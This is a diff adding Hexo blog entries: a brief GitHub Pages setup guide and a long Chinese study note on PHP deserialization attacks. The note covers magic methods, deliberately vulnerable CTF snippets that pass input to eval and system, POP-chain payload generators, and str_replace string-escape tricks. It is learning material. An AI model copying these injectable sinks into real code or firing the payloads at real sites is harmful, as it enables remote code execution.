@@ -331,6 +331,309 @@ nginx容器挂载目录前可以正常访问初始页面，但是进行目录挂
       </tags>
   </entry>
   <entry>
+    <title>搭建自己的GitHub-page</title>
+    <url>/2025/05/21/%E6%90%AD%E5%BB%BA%E8%87%AA%E5%B7%B1%E7%9A%84github-Page/</url>
+    <content><![CDATA[搭建自己的github-Page生成SSH Keyssh-keygen -t rsa -C &quot;github绑定邮箱&quot;
+
+
+验证ssh -T git@github.com
+
+
+新建自己的仓库
+
+
+
+
+
+
+
+
+下载git下载链接:https://git-scm.com/downloads/win
+参考链接:https://blog.csdn.net/qq_39809160/article/details/145712755
+
+搭建本地博客创建博客目录
+安装hexonpm install -g hexo/cli
+
+
+#创建一个新的hexo项目hexo init myblogs
+
+
+此时的目录结构
+
+
+cd myblogsnpm install
+
+此时项目结构
+
+运行hexo项目
+hexo server
+
+
+部署到github获取个人token
+
+
+
+
+
+
+打开_config.yml
+
+编辑_config.yml
+当前博客目录安装git插件npm install hexo-deployer-git --save
+
+最后hexo clean      # 清理 Hexo 缓存：hexo generate   # 重新生成静态文件#hexo deploy这步之前要先验证身份#git config --global user.email &quot;272510545@qq.com&quot;#git config --global user.name &quot;blkheadfish&quot;hexo deploy     # hexo deploy
+
+
+博客路径
+博客配置项在_config.yml中
+修改浏览器tab页标题
+
+#部署到githubhexo g -d
+
+
+]]></content>
+      <tags>
+        <tag>杂项</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>php反序列化漏洞</title>
+    <url>/2025/05/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
+    <content><![CDATA[反序列化漏洞成因：反序列化unserialize()中接收的字符串可控，通过更改字符串得到想要的对象
+php面向对象基础知识php中类和对象的写法class Test&#123;	var $name;//不推荐用var修饰，可以用public,private,protected修饰（与java一致）	var $id;	function __construct($name = null,$id = null)&#123;//构造函数		$this-&gt;name = $name;		$this-&gt;id = $id;	&#125;&#125;class Test&#123;	var $name;	var $id;	function __construct($name = null,$id = null)&#123;		$this-&gt;name = $name;		$this-&gt;id = $id;	&#125;&#125;$a = new Test();$a-&gt;name=&#x27;senpai&#x27;;$a-&gt;id=114514;print_r($a);/*print_r()打印对象实例的结果就是:&gt;Test Object(    [name] =&gt; senpai    [id] =&gt; 114514)[Finished in 852ms]*/
+
+php中构造函数不支持重载，如果想实现无参构造器和有参构造器都存在，要在参数中设置默认值;php访问内部成员用的是$this-&gt;成员变量名
+序列化
+可以进行序列化的内容：
+对象，数组，标量类型（整形，浮点，布尔，字符串），包含资源的数组和对象，null
+不能序列化的内容：
+类，资源（比如数据库连接），未定义类型
+
+字符串长度用于确定头尾双引号位置，防止出现 &quot;benben&quot;adada&quot;这种中间带有双引号报错的情况
+
+a:参数数量:&#123;i:索引;对应的序列化内容;&#125;
+
+
+O:类名长度:&quot;类名&quot;:变量数:&#123;s:变量名长度:&quot;变量名&quot;;变量值的序列化内容;&#125;
+private属性的成员变量序列化后，变量名前会加上0x00类名0x00(0x00是不可见字符，url编码后就是%00)
+protected属性的成员变量序列化后，变量名前会加上0x00*0x00
+&lt;?php	class Test&#123;		public $name;		private $id;	&#125;	$a = 1;	$b = &#x27;hello world!&#x27;;	$c = new Test();	$d = [1,2,3,4];	$e = 1.14514;	$f = null;	echo serialize($a).&quot;\n&quot;;	echo serialize($b).&quot;\n&quot;;	echo serialize($c).&quot;\n&quot;;	echo serialize($d).&quot;\n&quot;;	echo serialize($e).&quot;\n&quot;;	echo serialize($f);?&gt;/*i:1;s:12:&quot;hello world!&quot;;O:4:&quot;Test&quot;:2:&#123;s:4:&quot;name&quot;;N;s:8:&quot;&lt;0x00&gt;Test&lt;0x00&gt;id&quot;;N;&#125;a:4:&#123;i:0;i:1;i:1;i:2;i:2;i:3;i:3;i:4;&#125;d:1.14514;N;   [Finished in 1.1s]*/
+
+
+
+反序列化反序列化就是将字符串变成对象 unserialize(string $str)
+
+
+例题
+get方法传进来的变量benben就是序列化字符串
+
+/*自动把get请求收到的参数拼接到序列化字符串中*/$get = &#x27;O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:&#x27;.strlen($_GET[&#x27;benben&#x27;]).&#x27;:&quot;&#x27;.$_GET[&#x27;benben&#x27;].&#x27;&quot;;&#125;&#x27;;
+
+构造url，用?传递get请求的参数(这里我让他弹窗)
+?benben=O:4:&quot;test&quot;:1:&#123;s:1:&quot;a&quot;;s:36:&quot;echo &quot;&lt;script&gt;alert(123);&lt;/script&gt;&quot;;&quot;;&#125;
+使用var_dump()打印对象细节&lt;?php	class Test&#123;		public $id;		private $name;		protected $sex;		public function __construct($id = null,$name = null,$sex = null)&#123;			$this-&gt;id = $id;			$this-&gt;name = $name;			$this-&gt;sex = $sex;		&#125;	&#125;	$a = new Test(123,&#x27;淳平&#x27;,&#x27;男&#x27;);	var_dump($a);?&gt;/*object(Test)#1 (3) &#123;  [&quot;id&quot;]=&gt;  int(123)  [&quot;name&quot;:&quot;Test&quot;:private]=&gt;  string(6) &quot;淳平&quot;  [&quot;sex&quot;:protected]=&gt;  string(3) &quot;男&quot;&#125;   [Finished in 933ms]*/
+
+&lt;?php	class Test&#123;		public $id;		private $name;		protected $sex;		public function __construct($id = null,$name = null,$sex = null)&#123;			$this-&gt;id = $id;			$this-&gt;name = $name;			$this-&gt;sex = $sex;		&#125;	&#125;	$a = new Test(123,&#x27;淳平&#x27;,&#x27;男&#x27;);	echo serialize($a).&quot;\n&quot;;	$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:2:&quot;id&quot;;i:123;s:10:&quot;%00Test%00name&quot;;s:6:&quot;淳平&quot;;s:6:&quot;%00*%00sex&quot;;s:3:&quot;男&quot;;&#125;&#x27;;//复制echo内容	$str = urldecode($str);	var_dump(unserialize($str));?&gt;/*object(Test)#2 (3) &#123;  [&quot;id&quot;]=&gt;  int(123)  [&quot;name&quot;:&quot;Test&quot;:private]=&gt;  string(6) &quot;淳平&quot;  [&quot;sex&quot;:protected]=&gt;  string(3) &quot;男&quot;&#125;*/
+
+/**/&lt;?php	class Test&#123;		public $id;		private $name;		protected $sex;		public function __construct($id = null,$name = null,$sex = null)&#123;			$this-&gt;id = $id;			$this-&gt;name = $name;			$this-&gt;sex = $sex;		&#125;	&#125;	$a = new Test(123,&#x27;淳平&#x27;,&#x27;男&#x27;);	echo serialize($a).&quot;\n&quot;;	/*反序列化生成对象中成员变量的值，由提供给反序列化的序列化字符串中的值决定*/	$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:2:&quot;id&quot;;i:123;s:10:&quot;%00Test%00name&quot;;s:6:&quot;德川&quot;;s:6:&quot;%00*%00sex&quot;;s:3:&quot;男&quot;;&#125;&#x27;;	$str = urldecode($str);	var_dump(unserialize($str));?&gt;/*O:4:&quot;Test&quot;:3:&#123;s:2:&quot;id&quot;;i:123;s:10:&quot;�Test�name&quot;;s:6:&quot;淳平&quot;;s:6:&quot;�*�sex&quot;;s:3:&quot;男&quot;;&#125;object(Test)#2 (3) &#123;  [&quot;id&quot;]=&gt;  int(123)  [&quot;name&quot;:&quot;Test&quot;:private]=&gt;  string(6) &quot;德川&quot; 输出德川而不是最开始的淳平，因为更改了序列化字符串  [&quot;sex&quot;:protected]=&gt;  string(3) &quot;男&quot;&#125;*/
+
+魔术方法魔术方法：在特定条件下自动触发的方法
+触发前提：魔术方法所在的类或对象被调用
+
+魔术方法必须掌握触发时机，参数，返回值
+
+常见魔术方法
+
+构造与析构/*构造触发时机:当new对象时自动调用（构造器）功能:初始化对象参数:非必要返回值:无*/function __construct(args...);/*析构触发时机:对象的所有引用被删除或对象被显式销毁时执行,反序列化之后执行,代码运行结束执行功能:参数:无返回值:无*/function __destruct();&lt;?phpclass Test&#123;	public $name;	public function __construct()&#123;		echo &#x27;构造函数&#x27;.&quot;\n&quot;;	&#125;	public function __destruct()&#123;		echo &#x27;析构函数&#x27;.&quot;\n&quot;;	&#125;&#125;$a = new Test();//触发__construct();$str  = serialize($a);$str1 = &#x27;O:4:&quot;Test&quot;:1:&#123;s:4:&quot;name&quot;;N;&#125;&#x27;;$f = unserialize($str1); //触发__destruct();?&gt;//触发__destruct();    /*结果构造函数析构函数析构函数*/
+
+unserialize()触发析构函数是因为,反序列化是将原先实例销毁，再根据序列化字符串创建新对象
+&lt;?phpclass Test&#123;	public $name;	public function __construct($name = null)&#123;		$this-&gt;name = $name;		echo &#x27;构造函数&#x27;.&quot;\n&quot;;	&#125;	public function __destruct()&#123;		echo &#x27;析构函数&#x27;.&quot;\n&quot;;	&#125;&#125;$a = new Test(&#x27;淳平&#x27;);$str  = serialize($a);$f = unserialize($str);//$a被销毁了echo $a-&gt;name;//这里会警告$a为null?&gt;
+
+漏洞例题&lt;?phphighlight_file(__FILE__);error_reporting(0);class User&#123;	var $cmd = &quot;echo &#x27;dazhuang666!!&#x27;;&quot;;	public function __destruct()	&#123;		eval($this-&gt;cmd);//漏洞在这	&#125;&#125;$ser = $_GET[&quot;benben&quot;];unserialize($ser);//会在这调用__destruct()?&gt;
+
+需要构造序列化字符串，将$cmd改成要执行的php命令
+/*构造字符串*/$str = &#x27;O:4:&quot;User&quot;:1:&#123;s:3:&quot;cmd&quot;;s:20:&quot;echo &quot;Hello World!&quot;;&quot;;&#125;&#x27;;
+
+构造url，拼接参数?benben=O:4:&quot;User&quot;:1:&#123;s:3:&quot;cmd&quot;;s:20:&quot;echo &quot;Hello World!&quot;;&quot;;&#125;到localhost/ser后
+sleep先进行__sleep()再serialize()
+
+function __sleep();/*返回要序列化的属性名的数组触发时机：执行serialize()之前功能：返回需要被序列化的成员参数：无返回值：包含需要被序列化的成员属性名的数组*/&lt;?phpclass User&#123;	public $name;	public $id;	private $password;	public function __construct($name = null,$id = null,$password = null)&#123;		$this-&gt;name = $name;		$this-&gt;id = $id;		$this-&gt;password = $password;	&#125;	public  function __sleep()&#123;		return array(&#x27;name&#x27;,&#x27;id&#x27;);//返回包含属性名的数组	&#125;	&#125;$a = new User(&#x27;淳平&#x27;,114514,&#x27;114514&#x27;);echo serialize($a);//结果中将不会有password-- - - - - -- - - - - - - - -- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - /*O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;淳平&quot;;s:2:&quot;id&quot;;i:114514;&#125;*/
+
+例题&lt;?phphighlight_file(__FILE__);error_reporting(0);class User&#123;	const SITE = &#x27;uusama&#x27;;	public $username;	public $nickname;	private $password;	public function __construct($username, $nickname, $password)	&#123;		$this-&gt;username = $username;		$this-&gt;nickname = $nickname;		$this-&gt;password = $password;	&#125;	public function __sleep()	&#123;		system($this-&gt;username);//漏洞	&#125;&#125;$cmd = $_GET[&#x27;benben&#x27;];$user = new User($cmd, &#x27;b&#x27;, &#x27;c&#x27;);echo serialize($user);?&gt;
+
+因为__sleep()在serialize()前执行,$cmd对应的就是$username，所以我们只需要把get请求的参数换成任意的命令就行
+wakeup
+function __wakeup();/*触发时机：unserialize()之前功能：参数：返回值：*/&lt;?phpclass User&#123;	public $name;	public $id;	private $password;	public function __construct($name = null,$id = null,$password = null)&#123;		$this-&gt;name = $name;		$this-&gt;id = $id;		$this-&gt;password = $password;	&#125;	public function __sleep()&#123;		return array(&#x27;name&#x27;,&#x27;id&#x27;);	&#125;	public function __wakeup()&#123;		$this-&gt;password = &#x27;114514&#x27;;//反序列化前调用，给password赋值	&#125;&#125;$str = &#x27;O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;;s:6:&quot;淳平&quot;;s:2:&quot;id&quot;;i:114514;&#125;&#x27;;//没有passwordvar_dump(unserialize($str));//password有值了?&gt;/*object(User)#1 (3) &#123;  [&quot;name&quot;]=&gt;  string(6) &quot;淳平&quot;  [&quot;id&quot;]=&gt;  int(114514)  [&quot;password&quot;:&quot;User&quot;:private]=&gt;  string(6) &quot;114514&quot;&#125;*/
+
+例题 &lt;?phphighlight_file(__FILE__);error_reporting(0);class User &#123;    const SITE = &#x27;uusama&#x27;;    public $username;    public $nickname;    private $password;    private $order;    public function __wakeup() &#123;        system($this-&gt;username);//漏洞    &#125;&#125;$user_ser = $_GET[&#x27;benben&#x27;];//需要构造一个含有username的序列化字符串unserialize($user_ser);?&gt;
+
+思路:构造get参数为一个含有username的序列化字符串，username值为任意命令																		payload:  ?benben=O:4:&quot;User&quot;:1:&#123;s:8:&quot;username&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;
+toString和invokefunction __toString();/*触发时机：把对象当作字符串调用;调用对象要使用var_dump()或print_r(),使用echo或print就会调用__toString()功能：参数：返回值：字符串*/function __invoke();/*触发时机：把对象当作方法(函数)调用功能：参数：返回值：字符串*/&lt;?phpclass User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null,$username = null,$password = null)&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __tostring()&#123;		return &#x27;这不是字符串!&#x27;;	&#125;	public function __invoke()&#123;		return &#x27;这不是方法!!&#x27;;	&#125;&#125;$a = new User(1,&#x27;a&#x27;,&#x27;c&#x27;);echo $a;//输出这不是字符串echo $a();//输出这不是方法?&gt;
+
+错误调用相关魔术方法call
+function __call($arg1,$arg2);/*触发时机:调用不存在的成员方法功能：参数:$arg1:方法名 $arg2:参数值的数组返回值:无*/&lt;?phpclass User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null,$username = null,$password = null)&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __call($arg1,$arg2)&#123;		echo $arg1.&quot;\n&quot;;		for($i = 0;$i &lt; count($arg2); ++$i)&#123;//把传进去的所有参数打印出来			echo $arg2[$i].&quot;\n&quot;;		&#125;	&#125;&#125;$a = new User();$a-&gt;test(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;);//会调用call()?&gt;/*testabc*/
+
+callStatic
+function __callStatic($arg1,$arg2);/*php中调用成员常量或静态调用: ::$arg1:方法名	$arg2:参数值的数组*/&lt;?phpclass User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null,$username = null,$password = null)&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public static function __callStatic($arg1,$arg2)&#123;		echo $arg1.&quot;\n&quot;;		for($i = 0;$i &lt; count($arg2); ++$i)&#123;			echo $arg2[$i].&quot;\n&quot;;		&#125;	&#125;&#125;$a = new User();$a::test(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;);?&gt;
+
+get
+&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __get($arg1)	&#123;		echo $arg1;	&#125;&#125;$a = new User();$a-&gt;var2;?&gt;
+
+set
+&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __set($arg1,$arg2)&#123;		echo $arg1.$arg2;	&#125;&#125;$a = new User();$a-&gt;var2 = &#x27;111&#x27;;//会输出var2111?&gt;
+
+isset
+/*arg1就是不可访问变量的属性名*/&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __isset($arg1)&#123;		echo $arg1;	&#125;&#125;$a = new User();isset($a-&gt;password);//私有成员不可访问empty($a-&gt;password);?&gt;
+
+unset
+clone
+&lt;?phperror_reporting(0);class User&#123;	public $id;	public $username;	private $password;	public function __construct($id = null, $username = null, $password = null)	&#123;		$this-&gt;id = $id;		$this-&gt;username = $username;		$this-&gt;password = $password;	&#125;	public function __clone()&#123;		echo &#x27;cloned!&#x27;;	&#125; &#125;$a = new User();$b = clone($a);//输出cloned!?&gt;
+
+总结表
+
+pop链前置知识 &lt;?phphighlight_file(__FILE__);error_reporting(0);class index &#123;    private $test;    public function __construct()&#123;        $this-&gt;test = new normal();    &#125;    public function __destruct()&#123;        $this-&gt;test-&gt;action();    &#125;&#125;class normal &#123;    public function action()&#123;        echo &quot;please attack me&quot;;    &#125;&#125;class evil &#123;    var $test2;    public function action()&#123;        eval($this-&gt;test2);//&lt;-漏洞    &#125;&#125;unserialize($_GET[&#x27;test&#x27;]);?&gt;
+
+反推法1.先找漏洞在哪，eval()函数处有漏洞2.eval调用evil的$test23.但是单单unserialize()并不会调用evil的action()4.unserialize()会调用__destruct()5.但是__destruct()中的$test是normal的实例6.要想办法构造序列化字符串使index中的$test变成evil的实例
+
+构造序列化字符串
+方法1:直接改代码加注释，在类里赋值，让php帮忙跑出想要的序列化字符串
+&lt;?php// highlight_file(__FILE__);error_reporting(0);class index&#123;	private $test;	public function __construct()	&#123;		$this-&gt;test = new evil();	&#125;	// public function __destruct()	// &#123;	// 	$this-&gt;test-&gt;action();	// &#125;&#125;// class normal// &#123;// 	public function action()// 	&#123;// 		echo &quot;please attack me&quot;;// 	&#125;// &#125;class evil&#123;	var $test2 = &#x27;echo &quot;Hello World!&quot;;&#x27;;	// public function action()	// &#123;	// 	eval($this-&gt;test2);	// &#125;&#125;// unserialize($_GET[&#x27;test&#x27;]);echo urlencode(serialize(new index()));?&gt;
+
+方法2:在类外进行赋值
+&lt;?phphighlight_file(__FILE__);error_reporting(0);class index&#123;	public $test;//偷偷改成public，如果是private就只能用第一种方式&#125;class evil&#123;	var $test2;&#125;$a = new evil();$a-&gt;test2 = &#x27;system(&quot;ls&quot;)&#x27;;$b = new index();$b-&gt;test = $a;echo serialize($b);?&gt;
+
+魔术方法触发规则触发前提：魔术方法所在的类或对象被调用
+eg:
+ &lt;?phphighlight_file(__FILE__);error_reporting(0);class fast &#123;    public $source;    public function __wakeup()&#123;        echo &quot;wakeup is here!!&quot;;        echo  $this-&gt;source;//如果要触发toString(),这里的source就得是sec的对象    &#125;&#125;class sec &#123;    var $benben;    public function __tostring()&#123;        echo &quot;tostring is here!!&quot;;    &#125;&#125;$b = $_GET[&#x27;benben&#x27;];unserialize($b);?&gt;
+
+目标:显示tostring is here!!
+
+//生成序列化字符串的url编码&lt;?phperror_reporting(0);class fast&#123;	public $source;&#125;class sec&#123;	var $benben;&#125;$a = new fast();$b = new sec();$a-&gt;source = $b;echo urlencode(serialize($a));//输出O%3A4%3A%22fast%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A3%3A%22sec%22%3A1%3A%7Bs%3A6%3A%22benben%22%3BN%3B%7D%7D?&gt;
+
+构造url,?benben=O%3A4%3A%22fast%22%3A1%3A%7Bs%3A6%3A%22source%22%3BO%3A3%3A%22sec%22%3A1%3A%7Bs%3A6%3A%22benben%22%3BN%3B%7D%7D
+先执行wakeup()再执行toString()
+POP链构造与POC编写
+eg:
+ &lt;?php//flag is in flag.phphighlight_file(__FILE__);error_reporting(0);class Modifier &#123;    private $var;    public function append($value)    &#123;        include($value);        echo $flag;//1.目的要输出$flag    &#125;    public function __invoke()&#123;//2.触发__invoke()调用append()并把$var设置成flag.php        $this-&gt;append($this-&gt;var);    &#125;&#125;class Show&#123;    public $source;    public $str;    public function __toString()&#123;        return $this-&gt;str-&gt;source;//4.如果把$str赋值为Test，Test中没有source成员，就会触发__get()    &#125;    public function __wakeup()&#123;//6.最终unserialize()触发__wakeup()        echo $this-&gt;source;//5.触发toString(),把自己作为变量赋值给$source    &#125;&#125;class Test&#123;    public $p;    public function __construct()&#123;        $this-&gt;p = array();    &#125;    public function __get($key)&#123;        $function = $this-&gt;p;        return $function();//3.如果把$p变成Modifier,调用__get()就会触发Modifier的__invoke()    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;]))&#123;    unserialize($_GET[&#x27;pop&#x27;]);&#125;?&gt; 
+
+第一步：触发invoke，使$var = &#39;flag.php&#39;
+第二步：触发get，给$p赋值为对象Modifier
+第三步：触发toString，给$str赋值为对象Test
+第四步：触发wakeup，给source赋值为自己的对象
+因为wakeup在Show中，所以我们构造序列化字符串中传递的参数就是Show
+&lt;?php//flag is in flag.php// highlight_file(__FILE__);error_reporting(0);class Modifier &#123;    private $var = &#x27;flag.php&#x27;;//私有属性就不能在外赋值了&#125;class Show&#123;    public $source;    public $str;&#125;class Test&#123;    public $p;&#125;$a  = new Modifier();$b = new Show();$c = new Test();$b-&gt;source = $b;$b-&gt;str = $c;$c-&gt;p = $a;echo urlencode(serialize($b));?&gt; 
+
+把url编码后的序列化字符串作为参数传入?pop=
+得到flag：&#96;&#96; ctfstu&#123;5c202c62-7567-4fa0-a370-134fe9d16ce7&#125;
+
+字符串逃逸利用str_replace()
+/** * @param array|string $search 要被替换的 * @param array|string $replace 要替换的 * @param array|string $subject 替换的对象 * @return void */function str_replace(array|string $search, array|string $replace, array|string $subject);
+
+
+反序列化时，属性长度不对，成员数量不对都无法进行序列化，会显示bool(false)
+&lt;?phperror_reporting(0);class Test&#123;	public $a;	public $b;&#125;$a=new Test();// echo serialize($a);// $ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;$ser_str = &#x27;O:4:&quot;Test&quot;:1:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;//成员数量不对var_dump(unserialize($ser_str));?&gt;&lt;!--bool(false)--&gt;&lt;?phperror_reporting(0);class Test&#123;	public $a;    public $b;&#125;$a=new Test();// echo serialize($a);// $ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;$ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1111:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;//长度不对var_dump(unserialize($ser_str));?&gt;&lt;!--bool(false)--&gt;
+
+如果反序列化时，忽略了某个存在的变量，序列化字符串中加上新的变量，最终反序列化结果会包含被忽略的变量和序列化字符串中的变量
+&lt;?phperror_reporting(0);class Test&#123;	public $a;	public $b;&#125;$a=new Test();// echo serialize($a);// $ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;&#x27;;$ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;N;&#125;&#x27;;var_dump(unserialize($ser_str));?&gt;&lt;!--object(Test)#2 (3) &#123;  [&quot;a&quot;]=&gt;  NULL  [&quot;b&quot;]=&gt;  NULL  [&quot;c&quot;]=&gt;  NULL&#125;&gt;
+
+为什么长度一定不能错?
+
+/*反序列化结束符为;&#125;*/&lt;?phperror_reporting(0);class Test&#123;	public $a;	public $b;	public $c = &#x27;c&#x27;;&#125;$a = new Test();$ser_str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;N;&#125;s:1:&quot;c&quot;;&quot;ccc&quot;;&#125;&#x27;;var_dump(unserialize($ser_str));/*object(Test)#2 (3) &#123;  [&quot;a&quot;]=&gt;  NULL  [&quot;b&quot;]=&gt;  NULL  [&quot;c&quot;]=&gt;  string(1) &quot;c&quot;&#125;*/?&gt;
+
+减少
+&lt;?phpclass Test&#123;	public $a;	public $b = &#x27;abcsystem&#x27;;	public $c;&#125;$str = serialize(new Test());/*$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;s:9:&quot;abcsystem&quot;;s:1:&quot;c&quot;;N;&#125;&#x27;*/$str = str_replace(&#x27;system&#x27;,&quot;&quot;,$str);/*$str = &#x27;O:4:&quot;Test&quot;:3:&#123;s:1:&quot;a&quot;;N;s:1:&quot;b&quot;;s:9:*/&quot;abc&quot;;s:1:&quot;&quot;/*&quot;c&quot;;N;&#125;&#x27;*/ //没注释的地方是会被当成$b的值的地方var_dump(unserialize($str));?&gt;
+
+
+
+就是构造成员变量的值，在str_replace()的时候，能刚好吃掉不想要的，能够构造我们的命令
+先把我们要执行的命令写好，这样便于构造长度
+//eg&lt;?phpclass Test&#123;	public $a = &#x27;abcsystem&#x27;;	public $b = &#x27;构造的表达式&#x27;;&#125;$str = serialize(new Test());echo &quot;$str\n&quot;;&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;abcsystem&quot;;s:1:&quot;b&quot;;s:?:&quot;构造的表达式&quot;;&#125;&#x27;;//要吃到构造的表达式所处的第一个&quot;?&gt;/*19个字符要3个system*/&lt;?phpclass Test&#123;	public $a = &#x27;abcsystemsystemsystem&#x27;;	public $b = &#x27;12&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&#x27;;//用;&#125;直接截断&#125;$str = serialize(new Test());echo &quot;$str\n&quot;;&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;abcsystemsystemsystem&quot;;s:1:&quot;b&quot;;s:37:&quot;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&quot;;&#125;&#x27;;//截到构造的表达式前只有19个字符，还要再在构造的表达式前补上2个字符(21 - 19 = 2)和&quot;;$str = str_replace(&#x27;system&#x27;,&#x27;&#x27;,$str);$str = &#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:21:&quot;abc&quot;;s:1:&quot;b&quot;;s:37:&quot;12&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&quot;;&#125;&#x27;;var_dump(unserialize($str));?&gt;  /*object(Test)#1 (2) &#123;  [&quot;a&quot;]=&gt;  string(21) &quot;abc&quot;;s:1:&quot;b&quot;;s:37:&quot;12&quot;  [&quot;b&quot;]=&gt;  string(20) &quot;echo &quot;hello world!&quot;;&quot;&#125;*/
+
+例题&lt;?phperror_reporting(0);function filter($name)&#123;	$safe = array(&quot;flag&quot;, &quot;php&quot;);	$name = str_replace($safe, &quot;hk&quot;, $name);	return $name;&#125;class test&#123;	var $user;	var $pass;	var $vip = false;	function __construct($user, $pass)	&#123;		$this-&gt;user = $user;		$this-&gt;pass = $pass;	&#125;&#125;$param = $_GET[&#x27;user&#x27;];$pass = $_GET[&#x27;pass&#x27;];$param = serialize(new test($param, $pass));$profile = unserialize(filter($param));if ($profile-&gt;vip) &#123;	echo file_get_contents(&quot;flag.php&quot;);&#125;?&gt;
+
+思路,三个属性,构造第一个属性,使它能吃掉剩下属性的值,在第二个属性中构造表达式使vip=true
+&lt;?phpclass test&#123;	var $user = &quot;php&quot;;	var $pass = &quot;&quot;;	var $vip;&#125;echo serialize(new test());?&gt;//O:4:&quot;test&quot;:3:&#123;s:4:&quot;user&quot;;s:3:&quot;php&quot;;s:4:&quot;pass&quot;;s:0:&quot;&quot;;s:3:&quot;vip&quot;;N;&#125;/*从user值吃到pass值的前一个&quot;,需要18个字符(除去最开始的php),php经过filter变成hk减少一个字符,一共需要18个php才能正确吃完让$user = 18个php让$pass = &quot;;s:4:&quot;pass&quot;;N;s:3:&quot;vip&quot;;b:1;&#125;构造url,得到flag*/
+
+
+增多
+用str_replace(),替换成一个更长的字符串，把多余的字符吐出来
+&lt;?phpclass Test&#123;	public $a = &#x27;a&#x27;;	public $b = &#x27;b&#x27;;&#125;$a = new Test();$str = serialize($a);//&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#x27;;$str = str_replace(&#x27;a&#x27;,&#x27;aaa&#x27;,$str);// echo &quot;$str\n&quot;;/*&#x27;O:4:&quot;Test&quot;:2:&#123;s:1:&quot;a*/aa/*&quot;;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:1:&quot;b&quot;;&#125;&#x27;;*/ //多出来的aa就是吐出的多余代码?&gt;
+
+思路：把吐出来的多余代码构造成功能性代码
+构造的字符串:&quot;;s:1:&quot;b&quot;:s:?:&quot;&quot;;&#125;   用;&#125;结束反序列化，不用管原功能性代码
+构造的字符串长度为x，将ls替换成pwd会吐一个字符出来，需要x个pwd，这样就能吐x个字符出来，与前面长度正确对应，功能性代码被正确吐出
+
+class Test&#123;	public $a = &#x27;ls&#x27;;	public $b = &#x27;b&#x27;;&#125;$a = new Test();echo serialize($a).&quot;\n&quot;;?&gt;/*想构造一个显示hello world,构造字符串&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125; 长度为39将ls用pwd替换,吐出一个字符,所以我们需要39个ls,替换后才能吐出39个字符,让功能性代码正确吐出*/&lt;?phpclass Test&#123;	public $a = &#x27;lslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslslsls&#x27;;//39个ls	public $b = &#x27;b&#x27;;&#125;$a = new Test();$hacker = &#x27;&quot;;s:1:&quot;b&quot;;s:20:&quot;echo &quot;hello world!&quot;;&quot;;&#125;&#x27;;$a-&gt;a = $a-&gt;a.$hacker;$str = serialize($a);echo &quot;$str\n&quot;;$str = str_replace(&#x27;ls&#x27;,&#x27;pwd&#x27;,$str);echo &quot;$str\n&quot;;// 